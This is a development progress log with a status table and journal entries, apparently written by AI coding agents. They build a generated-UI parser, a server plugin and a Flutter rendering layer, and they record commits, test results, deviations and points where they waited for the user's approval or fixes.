# Phase 9 progress log

Run book: `2026-11-06-phase9-run.md`. Update the table when a status changes; append journal entries at the bottom,
newest last. Models are the minimum; a higher one is fine.

## Status

| ID | Subphase / segment | Model | Status | Last commit |
|---|---|---|---|---|
| 9.1 | **GenUI** (`feat/genui`; plan `2026-10-31-genui.md`) | | | |
| G1 | Phase 0: live probe and OpenUI groundwork (gate) | Opus | done | `d535765` |
| G2 | 1.1–1.4: package, fixtures, lexer, parser, errors | Sonnet | done | `c205f14` |
| G3 | 1.5–1.6: streaming parser, evaluator, store | Opus | done | `f040585` |
| G4 | 1.7–1.8 prompt generator; Phase 2 server plugin | Sonnet | done | `39cff19` |
| G5 | Phase 3: rendering surfaces in Iris | Sonnet | done | `44259c1` |
| G6 | Phase 4: actions, inputs, reply kits | Sonnet | done | `95c9350` |
| G7 | Phases 5–6: study, Displays, learning loop | Sonnet | done | `ed515c8` |
| G8 | 7.1, 7.2, 7.5: demo, export/search, docs | Haiku | done | `9f6b719` |
| G9 | 7.3, 7.4: accessibility and device pass | Sonnet | done | `da9be8e` |
| G10 | 7.6 final review, release, PR | Opus | done | `1115dc1` |
| 9.2 | **Push notifications** (`feat/push`) | | | |
| P-spec | Brainstorm and design | Opus | done | `57f5882` |
| P-plan | Implementation plan with segment table | Opus | done | see journal |
| PS1 | Task 1: live probe (hooks, approval answering) | Opus | done | `7296630` |
| PS2 | Tasks 2–5: plugin registry, active chats, events, stream | Sonnet | done | `75c0113` |
| PS3 | Task 6: APNs sender and worker | Opus | done | `7e9aaa0` |
| PS4 | Tasks 7–8: app settings, active marking, tap and approve-on-open | Sonnet | done | `1a0c28d` |
| PS5 | Tasks 9–10: Android service, iOS native (Swift compile deferred to PS6) | Opus | done | `03e98aa` |
| PS6 | Task 11: device pass (Moto G45, iPhone) | Sonnet | done (Android; iOS not run) | `276e0dc` |
| PS7 | Task 12: final review, release, PR | Opus | done | `fbb076d` |
| IN1 | Plugin installer, Tasks 1-2 (`2026-11-13-plugin-installer.md`; runs before PS6) | Sonnet | done | `fdc3839` |
| IN2 | Plugin installer, Tasks 3-4: Settings row, onboarding screen | Sonnet | done | `3b0e344` |
| IN3 | Plugin installer, Task 5: live reinstall (after PS7's release) | Sonnet | doing | `05daea1` |
| 9.3 | **Offline cache and paging** (`feat/offline-cache`) | | | |
| C-spec | Brainstorm and design | Opus | todo | |
| C-plan | Implementation plan with segment table | Opus | todo | |
| C-build | Per the plan | per plan | todo | |
| 9.4 | **Native PKCE OAuth** (`feat/native-oauth`) | | | |
| O-spec | Brainstorm and design | Opus | todo | |
| O-plan | Implementation plan with segment table | Opus | todo | |
| O-build | Per the plan (Opus for the flow) | per plan | todo | |
| 9.5 | **Usage alerts and widgets** (`feat/usage-widgets`) | | | |
| W-spec | Brainstorm and design | Opus | todo | |
| W-plan | Implementation plan with segment table | Opus | todo | |
| W-build | Per the plan (Opus for widget extensions) | per plan | todo | |
| 9.6 | **Localisation** (`feat/l10n`) | | | |
| L-spec | Brainstorm and design | Opus | todo | |
| L-plan | Implementation plan with segment table | Opus | todo | |
| L-build | Per the plan (mostly Haiku/Sonnet) | per plan | todo | |
| 9.7 | **Voice extras** (`feat/voice-extras`): needs Phase 8 merged | | | |
| V-spec | Brainstorm and design | Opus | todo | |
| V-plan | Implementation plan with segment table | Opus | todo | |
| V-build | Per the plan (Opus for Live Activity) | per plan | todo | |

Each subphase ends with its own final review and PR (the plan's last segment, Opus); add that row when the plan is
written. Reorder 9.2–9.6 here if the user changes the order; 9.1 first and 9.7 last are fixed.

## Journal

### Setup — 2026-11-06
- Phase 9 split into subphases 9.1–9.7 with models assigned; `/phase9` added. Branch: `feat/genui` (GenUI spec and plan
  committed at `cf0b697`; their 2026-11-04 revisions are still uncommitted). Phase 8 voice is not merged (its Tasks
  17–19 are `todo` on `feat/phase8-voice`).
- Open items: GenUI plan's six open questions are unanswered (needed before G2); the order of 9.2–9.6 is my guess.
- Next: G1, Phase 0, step 0.1 (ask the user before touching their server).

### G1 — doing — 2026-11-06 21:50
- User approved the probe plugin and throwaway sessions on their server (this chat).
- Server reports release 2026.9.24 (`/api/status`); probe written against hermes-agent tag `v2026.9.24` (`f97608f1`),
  read in the scratchpad. Phase 8 voice is in fact merged (`b0a64c3`, PR #31); the setup entry above was wrong.
- On disk, uncommitted: `server/hermes-iris-probe/` (tool `iris_probe`; hooks pre_llm_call, pre_tool_call,
  post_llm_call, transform_llm_output, on_session_start; routes `/hello`, `/sessions/{id}/flag`, `/events`). Flags and
  an event log live under `<hermes home>/iris-probe/` because the dashboard api module loads separately.
- Next: 0.1 install on the server (no SSH alias here; waiting on the user), then 0.2.

### G1 — blocked — 2026-11-06 22:35
- 0.1 installed by the user. 0.2 done: `/api/plugins/iris-probe/hello` is 401 with Access headers only, 200 with the
  dashboard login (plugin routes sit behind dashboard auth). The plugin loads (`register` rows; home `/root/.hermes`);
  some periodic process loads plugins about every 9 s.
- Blocked: every chat turn now fails in about 1 s with `agent_init_failed` / `[Errno 2] No such file or directory`
  (model and provider empty in `session.info`), including a plain "pong" (`chat_write_live_test`). Unknown whether the
  probe or the restart caused it; the traceback is only in the server logs. Asked the user to disable the probe and
  restart, and to share the traceback.
- 0.9 mostly done meanwhile: OpenUI `eea983e` (MIT), spec read in full, 58 fixture cases; system prompt generated from
  the fixture library in the scratchpad (zod only, telemetry stubbed). Not yet written into the spec.
- On disk, uncommitted: `server/hermes-iris-probe/`, `test/live/genui_probe_live_test.dart`.
- Next: unblock, rerun `genui_probe_live_test.dart` "0.3" (fix the reconnect wait: `states.firstWhere` saw no live
  state), then 0.10, 0.11.

### G1 — doing — 2026-11-07 00:40
- Unblocked; not the probe. The dashboard service (up since 2026-10-29) was running on a bundled Python that a later
  Hermes update had deleted (`/proc/<pid>/exe → .previous-python-… (deleted)`), so agent builds failed with
  `[Errno 2]`. Restarting `hermes-dashboard` fixed it; chat pong passes with the probe disabled, then the probe was
  re-enabled and the dashboard restarted again. Server work over SSH (`root@hermes`, user's key via the Windows agent).
- Probe test: `reconnectNow()` is a no-op while live, so 0.5 now disposes the session and opens a fresh WebSocket
  session before resuming.
- Next: read the rerun of the "0.3–0.8" test, then 0.10, 0.11.

### G1 — doing — 2026-11-07 00:55
- 0.3–0.8 done (probe test passes, 2 min 36 s; run 1 stalled because the model could not emit thousands of repeated
  `x`s, so payloads are now comma-separated number ranges). Findings, to go into the spec at 0.11:
  - Plugin tools are deferred: the model finds them with `tool_search` → `tool_describe` → `tool_call` (about 13 s
    extra on first use). `tool.generating` names the wrapper (`mcp__tool_call`), not the real tool; only `tool.start`
    has the real name and full args (11 892 chars arrived untruncated). Args never stream: `tool.generating` →
    `tool.start` took 4 s / 28 s / 39 s for 1.1k / 7.9k / 11.9k chars.
  - Hook `session_id` is the stored id, not the runtime id. `pre_llm_call` context is not stored in the user row.
  - A fresh WebSocket plus `session.resume` returned the same runtime id; the flag still applied.
  - Stored rows parse (`HistoryParser` ok); tool rows hold the tool result as content.
  - Platform is `desktop`, sender `basic:admin`.
  - `transform_llm_output` replaces `message.complete` text and the stored row, but the streamed deltas carry the
    original text. It also fires for a background (auxiliary) call with a different turn id.
- 0.10 under way: `test/live/genui_fluency_live_test.dart` (new) sends the generated prompt and five requests, then
  asks for A2UI; replies go to the scratchpad and are checked with OpenUI's own TypeScript parser.

### G1 — done — 2026-11-07 01:10
- 0.10 go: 5/5 displays first-try valid by OpenUI's parser (no errors, unresolved refs or orphans) and correct by eye;
  6–7 s per reply; 778 tokens vs 1,521 for the same displays as A2UI JSON (o200k proxy).
- 0.11: findings written into the spec ("Phase 0 findings"); D2b dropped from v1; D3 keyed by stored id; risks
  updated. Plan 0.1–0.11 ticked. Probe disabled and deleted on the server (`~/.hermes/plugins/iris-probe` and its
  data dir); dashboard restarted; pong passes. Its name stays in `plugins.disabled` in the server config (harmless).
- Gate still open: the GenUI plan's open questions 1, 2 and 6 need the user's answers before G2.
- segment G1 complete

### G1 gate — 2026-11-07 01:05
- User answered the GenUI plan's open questions 1, 2 and 6 as proposed: plugin in this repo (`server/hermes-iris/`),
  `openui_lang` in this repo, Python port of the parser (D10). Recorded in the plan. Gate closed; G2 can start.
- Next: G2 (Sonnet), 1.1 skeleton + fixtures.

### G2 — doing — 2026-11-07
- Running as Sonnet 5.5. Git matches the log (G1 `d535765`; HEAD `05728bd`). OpenUI clone still at `eea983e` in an earlier scratchpad (`91330a6be4617d07/20c4ae4a-…/scratchpad/openui`).
- Next: 1.1 package skeleton, vendored fixtures, runner.

### G2 — doing — 2026-11-07
- 1.1 done (`b6b9ae7`): package, 145 vendored fixture files + `NOTICE`, runner; `dart test` 53 red, 6 skipped (editing, validation-only), `dart analyze` clean.
- 1.2 done: `lib/src/lexer.dart` + 22 tests green, analyze clean. Comments are skipped in the lexer; fence extraction and the `]]>openui:` marker are for 1.3.
- Next: 1.3 parser (source prep, statements, expressions, `LibrarySpec` models).

### G2 — doing — 2026-11-07
- 1.3 done: `source.dart` (fences, marker lines), `statements.dart` (boundaries incl. multi-line ternary, kinds), `expr_parser.dart`, `ast.dart`, `program.dart` (hoisting, entry, fallback, orphans), `library_spec.dart` (typed models, bindable from signature, JSON round trip). Lexer now reports unterminated strings via `lexAll`. All unit tests green, analyze clean.
- Deviation: positional → named prop mapping moves to 1.4 (it needs the schema and the drop rules). Fixtures still red: they compare an evaluated tree, so most need 1.4 (materialize + errors) and 1.6 (evaluator); the runner will show which.
- Next: 1.4 materializer + validation + error codes.

### G2 — 1.1–1.4 — done — 2026-11-07 — Sonnet 5.5
- Commits: b6b9ae7 skeleton+fixtures+runner; c3d4005 lexer; be40010 source/statements/expr parser/program/library spec; c205f14 materializer, validation, errors
- Verified: `dart analyze` in `packages/openui_lang` -> No issues found!; `dart test` -> 87 unit tests pass, 0 fail; conformance: 21 of 58 fixtures pass, 5 skipped (editing), 32 red.
- Red fixtures, all by design and all in later segments: actions/* (10), evaluation/005,006,008,010,011,012 and 001 (need the evaluator, 1.6), grammar/006,008,009 (evaluated values), state/001-004 (store, 1.6), streaming/* (4, task 1.5), entry/005 (state defaults), entry/006 (ternary root), errors/002 and 014 (evaluated function results). Passing: entry 001-004,007; errors 001,003,005-010,012,013; evaluation 003,004; grammar 003-005,010.
- Packages: openui_lang (path package): dev deps lints ^6.0.0, test ^1.25.0 only. No Flutter dependency changed.
- Deviations: (1) positional->named mapping and validation live in `materialize.dart` (1.4), not the parser (1.3). (2) Values needing evaluation stay `Deferred` in the tree; `ParseResult.summary({evaluate})` takes the evaluator hook that 1.6 supplies. (3) `query-cycle` is not implemented yet: it needs query/mutation result reads, so it goes with 1.6. (4) Lexer skips comments itself; `prepareSource` only does fences and `]]>openui:` marker lines. (5) A reference to an unresolved name in a required prop drops the component silently (no `missing-required`), per section 2.3's stream-end rule; revisit if a 1.5 fixture says otherwise.
- Decisions for later tasks: `ParseResult.tree` holds `Element`/`Binding`/`Deferred`; the streaming parser (1.5) should reuse `splitStatements`, `Program.build` and `materialize` and only add prefix caching and implicit closing. `Program.build` takes statements in source order and does last-wins itself. Number props are `double`; `summarizeValue` prints integer-valued doubles as ints.
- segment G2 complete. Next: G3 (Opus), 1.5 streaming parser.

### G3 — 1.5 — done — 2026-11-07 — Opus 5.5
- Commits: edfbde6 streaming parser with prefix cache, implicit closing and batch equivalence
- Verified: `dart analyze` -> No issues found!; `dart test` -> 232 pass, 5 skipped, 30 red (all conformance; was 32: streaming/005 and 006 now pass, 001 and 003 need the evaluator); `test/streaming_test.dart` all green, including every fixture program streamed a character at a time and split in two at every boundary.
- Deviations / rulings: (1) `parseProgram` is now `StreamingParser(lib).end(text)`: the spec defines a batch parse as an ended one-chunk stream (rule 7), and only that way does implicit closing (streaming/006's `\`) apply to batch too. Cost if wrong: the property test compares incremental feeding with one-shot, not with an independent batch path. (2) `ParseResult` keeps flat fields (`errors`, `unresolved`, `incomplete`, new getter `statementCount`) instead of a nested `meta`. (3) A line completes only when the next line's first token has arrived and ends before the end of the text (a lone `/` may still become `//`). (4) While streaming: no `no-root`, no `parse-failed`, enum values accepted; all apply at `end()`.
- Next: 1.6 evaluator + store.

### G3 — 1.6 — done — 2026-11-07 — Opus 5.5
- Commits: f040585 evaluator, state store, validation rules and query-cycle detection
- Verified: `dart analyze` -> No issues found!; `dart test` -> 315 pass, 5 skipped (editing), 0 fail. Conformance: 54 of 54 runnable fixtures pass, including `state/005` (validation.json now runs) and every streaming case streamed and batch.
- Deviations / rulings: (1) The evaluator follows the reference `lang-core` runtime (read at `eea983e`) where the spec is silent: no schema re-check of evaluated component props; a null prop is left out; a runtime throw makes that prop null (spec 8.2) rather than the reference's raw-value fallback. (2) `@Each` substitutes the element into the template as a `ValueLit` (reference `substituteRef`), so actions capture their element; there is no scope map. (3) Value statements reached from computed expressions are materialized on demand; new structural errors found that way are added once (deduped against parse errors). (4) `localeCompare` is a root-collation stand-in for Latin text (punctuation < digits < letters; accent then case as tie-breaks, lower first), not full ICU. Cost if wrong: non-Latin `@Sort` order differs from browsers. (5) `url` rule requires a host, per the spec prose (the reference accepts `mailto:`). (6) `query-cycle` is reported at stream end, one error per cycle on its first query, component `Query`. (7) Caps: 64 nested references (then a `runtime-error` on the prop), 1000 elements per `@Each` (silent truncation).
- Decisions for later tasks: public API is `parseProgram` / `StreamingParser` -> `ParseResult` (`tree`, `errors`, `state`, `unresolved`, `orphans`, `incomplete`, `statementCount`), then `Evaluator(result, library, store:, functions:, resolveData:)` -> `evaluateRoot()` = `(root: Element?, errors)`; `summarize()` gives the fixture shape. Actions are `ActionValue` of `SetStep`/`ResetStep`/`RunStep`/`ToAssistantStep`/`OpenUrlStep`/`CustomStep`; `evaluateStepValue(SetStep)` evaluates at click time. Bindings stay `Binding(name)`; widgets write `StateStore.set`. `resolveData` is the hook Phase 4's query manager fills. The Python port (G4) must match these rulings.
- segment G3 complete. Next: G4 (Sonnet), 1.7 prompt generator.

### G4 — doing — 2026-11-07
- Running as Sonnet 5.5. Git matches the log (G3 `f040585`; HEAD `9a68b08`, clean apart from `store/screenshots/`).
- Next: 1.7 prompt generator.

### G4 — 1.7–1.8 — done — 2026-11-07 — Sonnet 5.5
- Commits: 7198c8d prompt generator; 95626d5 package README and phase check
- Verified: `dart test test/prompt_test.dart` -> 9 pass (byte-identical to OpenUI's TypeScript `generateSystemPrompt` for 7 library/option combinations: defaults, bindings, builtin functions alone, preamble+examples+rules, component groups, a minimal library with and without bindings); `dart analyze` in `packages/openui_lang` -> No issues found!; `dart test` -> 324 pass, 5 skipped (editing); conformance 54 passed / 5 skipped / 0 failed; `flutter test --exclude-tags live` -> 1400 pass, 4 skipped; no `dart:ui` or Flutter import in the package; README snippet compiled and ran. `flutter analyze` reports 3 infos in `lib/` I did not touch.
- Deviations: (1) Goldens come from the TypeScript reference (`eea983e`, run from the scratchpad with telemetry off), not from Python as the spec's risk table says: the TS is the oracle and Python (2.5) must match these files. (2) `.gitattributes` marks `test/golden/**` as `-text` so `core.autocrlf` cannot change their bytes. (3) Dart reads signatures and descriptions from the library JSON's `components` / `functions` / `actions` / `componentGroups` (pre-built, as OpenUI's generator does), not from the JSON Schema.
- Decisions for later tasks: `generateSystemPrompt(library, options: PromptOptions(bindings:, builtinFunctions:, preamble:, examples:, additionalRules:))`; `bindings` defaults to false, `builtinFunctions` to `bindings`. Goldens and their library files are in `packages/openui_lang/test/golden/prompt/` (`<library>.library.json` + `<case>.txt`); the Python prompt port (2.5) should read the same files. Iris writes its own preamble (pass `preamble`).
- Next: 2.1 server skeleton (`server/hermes-iris/`).

### G4 — doing — 2026-11-07 (checkpoint after 2.5)
- Done and committed: 2.1 skeleton (`0b98234`), 2.2 auth audit (`289221d`), 2.3 store (`d200982`), 2.4 Python parser/validator (`7c6f5c4`), 2.5 Python prompt + provisional catalog (`f502663`). 1.7–1.8 are logged above.
- Verified: `server/hermes-iris/.venv/Scripts/python -m pytest` -> 146 pass, 1 skipped (POSIX file modes); 53 conformance fixtures pass structurally (24 compare the whole tree, 29 only structure: they need an evaluator), 6,321 fixture prefixes agree with the Dart parser (`tests/test_crosscheck_dart.py`, needs `dart` on PATH); 7 prompt goldens byte-identical to Dart/TypeScript.
- Test setup: `cd server/hermes-iris && python -m venv .venv && .venv/Scripts/python -m pip install fastapi httpx pytest pyyaml` (the venv is git-ignored).
- Deviations: (1) 2.2 has no local "unauthenticated -> 401" test: Hermes's middleware gates every `/api/*` path not on its fixed public list, and no local test can run it; `tests/test_auth.py` audits what the plugin controls (no route can be public, every route takes `?profile=`) and the real 401 check moves to 2.12. (2) `plugin_api.py` loads the plugin directory as package `hermes_iris` itself (Hermes imports it from its file, outside any package). (3) Store root is `<default Hermes root>/iris/<profile>` (not the per-process home), so hooks and routes agree for named profiles. (4) The Python port is validation-only and strict by policy: `validate_program` rejects anything the language would silently drop (unknown component, unreferenced or undefined statement, missing root, computed root, Query/Mutation, unterminated text) and enforces the spec limits (60 statements, 12 KB, depth 8, 2 KB strings). `parse_program` stays spec-faithful. (5) `catalog/v1.library.json` is a provisional 12-component stand-in (`x-iris-provisional`) until Phase 3.1 exports the real one from Dart.
- Next: 2.6 session flag (`POST sessions/{id}/genui`).

### G4 — doing — 2026-11-07 (checkpoint after 2.11)
- Done and committed: 2.6 session flag (`c87f630`), 2.7 `iris_ui` + templates (`42050c2`), 2.8 guards (`b6ece55`), 2.9 turn context (`33590f8`), 2.10 surface routes (`22f801e`), 2.11 skill (`2317e74`), then the README. 1.7–1.8 and 2.1–2.5 are logged above.
- Verified: `server/hermes-iris/.venv/Scripts/python -m pytest` -> 265 pass, 1 skipped (POSIX file modes); `tools/build_skill_refs.py --check` clean; every program in `references/patterns.md` validates against the catalog; context is about 1.3k characters for the v1 catalog and templates (cap 2,500, tested with a 300-component library and 200 templates).
- Deviations / decisions: (1) Hermes passes `session_id` (the stored id, same as hooks) to tool handlers; the live check must confirm it. (2) The context points at `skill_view('iris:iris-genui', 'references/library.md')` (plugin skills resolve as `<plugin>:<skill>`); confirm in 2.12. (3) 2.10's test and route were written together (no separate red run). (4) Surfaces list returns summaries without code; one surface returns the full record. (5) `iris_ui` is registered with toolset `iris`; the 4-surfaces-per-turn cap lives in the `pre_tool_call` guard (handlers get no turn id).
- Blocked on the user for the last Phase 2 task: **2.12 live check** installs `hermes-iris` on the user's Hermes server (copy to `~/.hermes/plugins/iris`, enable, restart `hermes-dashboard`), flags throwaway sessions and runs 10 varied prompts (each turn waits >= 240 s). The run book requires telling the user first and waiting for a yes. Needs SSH access (`root@hermes`) and the dashboard login for the route checks, including the real "no login -> 401" check deferred from 2.2.
- Next: 2.12 (after the user says yes), then 1.8 is already done; then write `segment G4 complete` and hand over to G5.

### G4 — blocked — 2026-11-07 (2.12 live check)
- User approved the install in this chat. Installed `hermes-iris` 0.1.0 to `~/.hermes/plugins/iris` over SSH (Windows OpenSSH via PowerShell; Git Bash's ssh cannot see the agent; Tailscale dropped for a few minutes mid-task), `hermes plugins enable iris`, restarted `hermes-dashboard`: active, no plugin errors in the journal.
- Verified live (`test/live/genui_plugin_live_test.dart`): no login -> **401**, login -> 200; `capabilities` = `{version 0.1.0, openui 1.0, library_ids [v1], features [capabilities, session-flag, surfaces]}`; `POST sessions/{stored}/genui` flags; `GET surfaces/{session}` -> empty list; throwaway session deleted afterwards.
- **Blocked:** the 10-prompt measurement did not run. Every chat turn failed in seconds with the same 402-character error text, and the dashboard journal shows the model provider answering `HTTP 404 ... Function '<id>' Not found for account` on each turn. That is the server's model/provider configuration (not the plugin; no iris error appears), so the first-try validity and retry counts are not measured, and the open assumptions are still unchecked: that tool handlers get the stored `session_id`, and that `skill_view('iris:iris-genui', 'references/library.md')` resolves.
- Needs the user: fix or re-point the model/provider on the Hermes server, then rerun `flutter test --tags live --run-skipped test/live/genui_plugin_live_test.dart --plain-name "ten prompts"` (about 30 minutes). The plugin stays installed and enabled on the server.
- Next: 2.12 rerun, then write `segment G4 complete` (next: G5, Sonnet, plan 3.1).

### G4 — 2.12 — done — 2026-11-07 — Sonnet 5.5
- Commits: this log and the live test fix (`test(genui): count accepted iris_ui calls from stored revisions`).
- Verified: `flutter test --tags live --run-skipped test/live/genui_plugin_live_test.dart --plain-name "ten prompts"` against the user's server (model provider fixed by the user) -> passed. 9 of 10 turns made a display; **first-try valid 8 of 9; 1 retry** (prompt 5, after a `skill_view` call); prompt 8 gave a text-only reply. All surfaces stored under the stored session id, so tool handlers do get the stored `session_id`. The throwaway session was deleted.
- Deviations: `tool.complete` payloads (`tool_id, name, args, duration_s, result`) did not yield a parseable `ok` from `result` on the first run (all 10 counted failed, wrongly), so the test now counts accepted calls from the growth in stored revisions. Prompt 5's failure text is not captured. `skill_view('iris:iris-genui', ...)` was called in prompt 5; whether it resolved is inferred from the retry succeeding, not read directly.
- Decisions for later tasks: surfaces are the source of truth for success; `tool.complete.result` is not reliable for the client.
- segment G4 complete. Next: G5 (Sonnet), Phase 3, task 3.1.

### G5 — doing — 2026-11-07
- Running as Sonnet 5.5. Git matches the log (G4 `39cff19`; HEAD `e67f919`, clean apart from `store/screenshots/`).
- Next: 3.1 Iris library, part 1.

### G5 — 3.1 — done — 2026-11-07 — Sonnet 5.5
- Commits: 2f6c78b Iris component library in Dart, exported to the plugin catalog
- Verified: `flutter test test/features/genui/iris_library_test.dart` -> 7 pass (drift test failed first against the provisional catalog, then passed after `IRIS_WRITE_CATALOG=1`); `flutter analyze lib/features/genui test/features/genui` -> No issues found!; `server/hermes-iris/.venv/Scripts/python -m pytest` -> 265 pass, 1 skipped; `tools/build_skill_refs.py --check` clean.
- Packages: `openui_lang` added to `pubspec.yaml` as a path dependency (`packages/openui_lang`); no pub.dev package added.
- Deviations: (1) Part 1 holds 27 components: layout (Stack, Card, Section, Divider, Tabs, Tab, Expander), text and data (Text, Markdown, KeyValue, Stat, StatRow, StatusPill, Table, ListRow, Timeline, TimelineItem, Checklist, ChecklistItem, Progress, CodeBlock, Diff, Image, Link) and `Button`, kept from the provisional catalog so existing patterns validate; its builder and the inputs, charts and `ApproveReject`/`Submit` are Phase 4. Tab, TimelineItem and ChecklistItem are small sub-components. (2) Functions `Percent`, `Money`, `Ago`; action `Ask`. (3) Added `componentGroups` (Layout, Text and data, Actions) so the prompt is grouped. (4) The two context snapshot goldens in `server/hermes-iris/tests/golden/` were regenerated on purpose: the digest lists every component (1,509 and 1,618 characters, cap 2,500). (5) The drift test refreshes the catalog when `IRIS_WRITE_CATALOG=1`.
- Decisions for later tasks: `IrisLibrary.components/functions/actions/groups`, `toJson()`, `toLibrarySpec()` in `lib/features/genui/render/iris_library.dart`; builders are not on the definitions, 3.2 keys them by component name. `Evaluator` returns `Element` with `type` and `props`. The evaluator has no `@Money`/`@Ago` implementation yet: 3.2 or 3.3 must register them as `OpenUiFunction`s.
- Next: 3.2 node builder.

### G5 — 3.2 — done — 2026-11-07 — Sonnet 5.5
- Commits: 8f0c467 node builder maps the OpenUI tree to Iris widgets
- Verified: `flutter test test/features/genui` -> 31 pass (22 builder tests incl. no overflow at 1x and 2x text, light and dark; every library component drawn; tab, expander, button, link behaviour; semantics labels); `flutter analyze lib/features/genui test/features/genui` -> No issues found!
- Deviations: (1) Unresolved and incomplete nodes never appear in the evaluated tree (the parser drops them), so the skeleton is driven by the surface: `NodeBuilder.surface(context, root, pending:, errorCount:)` appends `IrisSurfaceSkeleton` while pending and a quiet "Can't show this part" when parts were dropped; an unknown component, a missing required value and nesting past 8 become `IrisCantShow` per node. (2) `UiElement` is the typedef for OpenUI's `Element` (Flutter's `Element` clashes). (3) `dart format` (default width) was applied to the 3.1 files too.
- Decisions for later tasks: `NodeEnv(onAction:, onOpenUrl:)` is the only coupling to the host: Phase 4 supplies them; buttons are disabled without `onAction`, links are plain text without `onOpenUrl`, and the host owns link confirmation. A button with no action sends `ActionValue([CustomStep('Ask', {'text': label})])`. Image reuses `MarkdownImage` (host allow-list via `ImageHostScope`). Table/Diff scroll sideways; Tabs/Expander keep their state locally.
- Next: 3.3 `OpenUiView` (also registers `Percent`, `Money`, `Ago` as `OpenUiFunction`s).

### G5 — 3.3 — done — 2026-11-07 — Sonnet 5.5
- Commits: e4f0006 OpenUiView with streaming, fallback text, height clamp and light/dark goldens
- Verified: `flutter test test/features/genui` -> 63 pass (library 7, functions 15, node builder 22+, view 11, goldens 6); `flutter analyze lib/features/genui test/features/genui` -> No issues found!; the six goldens (layout, data, more × dark, light) were opened and looked at: a first pass showed pills stacking in a column, a failure-hued progress bar and ragged diff tints, all fixed before the goldens were committed.
- Deviations: (1) `@Percent`, `@Money`, `@Ago` live in `render/iris_functions.dart` (pure Dart, 15 tests); `Ago` takes an injectable clock. (2) The progress bar and ring use the accent, not `IrisGauge`'s default fill-shaded tint (that tint suits a context window, not task progress). (3) Primary buttons render full width in a column; left as is.
- Decisions for later tasks: `OpenUiView(code:, fallback:, streaming:, env:, maxHeight: 480, now:)`; it owns the parser, `StateStore` and evaluator, re-evaluates on store changes, shows `IrisSurfaceSkeleton` while pending, `IrisMarkdown(fallback)` (or the quiet chip) on a fatal error or no root, and clamps with "Show all" using one widget structure so tab and expander state survives. `OpenUiView.library` is the shared `LibrarySpec`. Goldens are in `test/features/genui/goldens/`.
- Next: 3.4 capability and API (`ServerCapability.irisGenui`, `lib/data/genui/`).

### G5 — 3.4 — done — 2026-11-07 — Sonnet 5.5
- Commits: see the `feat(genui): iris capability, plugin API and iris_ui / iris-action parsing` commit (sha in the next entry's header line)
- Verified: `flutter test test/data/genui_test.dart` -> 32 pass; `flutter test --exclude-tags live` -> 1,495 pass, 4 skipped; `flutter analyze lib/data/genui test/data/genui_test.dart lib/data/net` -> No issues found!
- Deviations: (1) A test of mine found a real defect: a context containing the literal closing tag spilled into the message the person reads. `IrisActionEnvelope.attachTo` now escapes `<` as `<` inside the JSON, so the closing tag can occur only once; tested. (2) `iris_ui` arguments cut off mid-way are not read (no partial JSON repair): the stored surface by id is the source of truth (3.5 fetches it). (3) The tool-call parser also accepts Hermes's bridge shape (`tool_call` / `mcp__tool_call` naming the real tool inside); that shape is an assumption from the Phase 0 notes and must be confirmed against a stored row in 3.7. (4) Payload fixtures are shaped after the Phase 0 findings, not copied from recorded traffic (the recordings are not in the repo).
- Decisions for later tasks: `ServerCapability.irisGenui` is probed at `/api/plugins/iris/capabilities` (a server whose cached probe predates it counts as "not confirmed" until the next probe). `DashboardGenUiApi(client, profile:)` is the REST layer: `capabilities`, `flagSession`/`unflagSession` (stored session id), `surfaces`, `surface`. `GenUiParser.surfaceRef(name:, input:, output:)` -> `UiSurfaceRef` (`surfaceId`, `placement`, `code`, `fallback`, `template`, `deleted`, `accepted`, `rev`); `accepted` is advisory. `IrisActionEnvelope.attachTo(text)` / `.split(text)` / `.strip(text)`; `maxContextChars` 4000 (larger context is dropped, not cut). 3.5 must strip the envelope from stored user rows with `IrisActionEnvelope.strip`.
- Next: 3.5 transcript integration.

### G5 — doing — 2026-11-07 (checkpoint after 3.5)
- Done and committed: 3.1 `2f6c78b`, 3.2 `8f0c467`, 3.3 `e4f0006`, 3.4 `47795c2`, 3.5 `37e95b1`. Usage limit hit; 3.6 and 3.7 not started.
- Verified for 3.5: `flutter test --exclude-tags live` -> 1,527 pass, 4 skipped; `flutter analyze lib test` -> only 3 pre-existing infos.
- 3.5 notes: `UiSurfaceItem` in the transcript (history parser and live reducer; newest mention of a surface id wins; delete removes; refusal shows a failed tool card); `SurfaceBlock` draws `ref.code` or fetches by id through `SurfaceBackend`; reply kits are not drawn in the transcript (Phase 4); envelope stripped from stored user rows; links in displays are plain text until Phase 4 adds confirmation. Bridge-shaped tool rows are an assumption to confirm in 3.7.
- Lesson: never run `dart format` on whole `lib`/`test` (reformats ~70 unrelated files); I reverted that churn before committing.
- Next: 3.6 session flagging + settings, then 3.7 phase check.

### G5 — 3.6 — done — 2026-11-07 — Sonnet 5.5
- Commits: 81bb484 feat(genui): flag sessions for generated displays, with a per-profile switch in Settings
- Verified: `flutter test test/data/genui_flagging_test.dart` red first (no `genUi` parameter), then 10 pass; `flutter test test/features/genui/genui_settings_test.dart` 4 pass; `flutter test --exclude-tags live` -> 1,541 pass, 4 skipped; `dart test` in `packages/openui_lang` -> 324 pass, 5 skipped; `flutter analyze lib test` -> the 3 pre-existing infos only. The four settings goldens (screen settings and voice E1a, light and dark) were regenerated because the new group is visible; I looked at the settings dark and E1a light ones.
- Deviations: (1) Flagging lives in `DashboardChat.resume` and `create` through a `GenUiController` (new `lib/data/genui/genui_controller.dart`), not in a screen-level controller: every attach, including each reconnect (which resumes), re-flags, and no chat-screen call site changed. Branch conversations are flagged when they are opened (resume). (2) `SurfaceBackend` gained `genUiCapabilities()` for the plugin version in Settings. (3) The group sits after Home, so existing settings tests that scroll to Appearance are unaffected. It is hidden in the demo.
- Decisions for later tasks: the switch is `genUiEnabledProvider` (`<server>/<profile>`, key `genui.enabled`, absent means off); `genUiActiveProvider` = switch on and capability confirmed. Turning it off stops flagging new attaches; sessions already flagged on the server stay flagged until the plugin gets an unflag call from the client (not wired).
- Next: 3.7 phase check (full tests and analyze are already green; still to do: debug APK and the live emulator check, which needs the user's server and at least 240 s per turn).

### G5 — 3.7 — blocked — 2026-11-07 (live check)
- Done: full `flutter test --exclude-tags live` (1,541 pass, 4 skipped), `dart test` in `packages/openui_lang` (324 pass), `flutter analyze lib test` (3 pre-existing infos), `flutter build apk --debug` -> built `build/app/outputs/flutter-apk/app-debug.apk`.
